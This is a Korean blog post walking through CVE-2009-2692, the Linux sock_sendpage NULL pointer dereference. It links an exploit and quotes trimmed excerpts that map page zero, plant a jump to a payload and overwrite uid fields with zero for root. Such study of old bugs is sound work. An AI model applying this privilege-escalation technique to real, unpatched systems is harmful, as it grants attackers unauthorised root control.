---
layout: post
title: "sock_sendpage"
date: 2016-01-11 14:42:27 +0900
comments: true
categories: 
---

CVE-2009-2692, sock_sendpage 에서 벌어지는 NULL pointer deref 버그를 정리한다. 발견자가 Tarvis Ormandy 인지 Brad Spengler 인지는 이런저런 문서를 읽어봐도 잘 모르겠다.

Exploit 자체는 꽤 클래식해서 정리해놓을 가치가 있다고 생각한다.

[exploit.c](http://http://downloads.securityfocus.com/vulnerabilities/exploits/36038-5.c)

#### Exploit

```
	...
	if ((zero_page = mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0)) == MAP_FAILED) {
		...
	}
```

0x0 에 4096 bytes 짜리 메모리 페이지를 할당한다.

그리고, payload 를 담고있는 변수의 주소를 0x00000002,0x3,0x4,0x5 에 깐다.

```
	*(char *)0x00000000 = 0xff;
	*(char *)0x00000001 = 0x25;
	*(unsigned long *)0x00000002 = (unsigned long)&kernel;
	*(char *)0x00000006 = 0xc3;
```

버그가 trigger 되면 `fp = *(unsigned long)(*(unsigned long)((0x00000000)->0x2)); (*fp)();` 하는 모양.

Kernel priv. 로 돌아가는 페이로드는 다음과 같다. cred structure 에서 uid 들을 고치는 페이로드.

```
	while (pcb_task_struct) {
		if (pcb_task_struct[0] == uid && pcb_task_struct[1] == uid &&
			pcb_task_struct[2] == uid & pcb_task_struct[3] == uid &&
			...) {
			pcb_task_struct[0] = [1] = ... = [7] = 0;
			break;
		}	
		pcb_task_struct++;
	}
```

그렇다면 왜 NULL porinter 를 deref 하게 되는지는 너무 오래된 버그라서 큰 의미는 없을 것 같다.
